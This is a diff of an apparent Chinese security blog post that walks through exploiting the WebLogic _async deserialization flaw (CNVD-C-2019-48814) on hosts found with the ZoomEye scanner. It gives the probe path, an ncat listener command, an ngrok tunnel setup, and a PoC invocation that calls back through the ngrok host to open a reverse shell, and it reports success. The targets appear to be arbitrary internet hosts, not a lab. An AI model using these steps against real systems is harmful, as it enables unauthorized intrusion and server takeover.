@@ -388,21 +388,24 @@
 <p><br></p>
 <p>利用zoomeye扫描到的ip</p>
 <p><br></p>
-<p>首先访问 目标ip/_async/AsyncResponseService 来判断是否启用该组件，如果存在则有可能存在此漏洞。</p>
-<p><img src="\img\weblogic1.png" alt></p>
+<p>首先访问 目标ip + /_async/AsyncResponseService 来判断是否启用该组件，如果存在则有可能存在此漏洞。</p>
+<p><img src="\img\weblogic1.jpg" alt></p>
 <p>漏洞原理是向/_async/AsyncResponseService发送XMLPoc，连接类型content-type: text/xml</p>
 <p>利用poc</p>
 <p><a href="https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py" target="_blank" rel="noopener">https://github.com/fuhei/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.py</a></p>
-<p>首先用ncat监听端口8888</p>
-<p><img src="\img\weblogic2.png" alt></p>
+<p>首先用ncat监听端口8889</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvp <span class="number">8889</span></span><br></pre></td></tr></table></figure>
+<p><img src="\img\weblogic2.jpg" alt></p>
 <p>然后利用ngrok进行内网穿透。下面这片文章写的非常好！</p>
 <p><a href="https://bbs.ichunqiu.com/thread-53000-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-53000-1-1.html</a></p>
-<p><img src="\img\weblogic3.png" alt></p>
+<p><img src="\img\weblogic3.jpg" alt></p>
 <p>最后利用poc尝试反弹端口getshell</p>
 <p>python2 CNVD-C-2019-48814.py -l &lt;ngrok分配的免费域名&gt; -p &lt;ngrok分配的端口&gt; -r &lt;目标ip+端口&gt;</p>
+<p>命令执行后，发现端口转发已经收到了</p>
+<p><img src="\img\weblogic6.jpg" alt></p>
 <p>漏洞利用成功</p>
-<p><img src="\img\weblogic4.png" alt></p>
-<p><img src="\img\weblogic5.png" alt></p>
+<p><img src="\img\weblogic4.jpg" alt></p>
+<p><img src="\img\weblogic5.jpg" alt></p>
 
       
     </div>
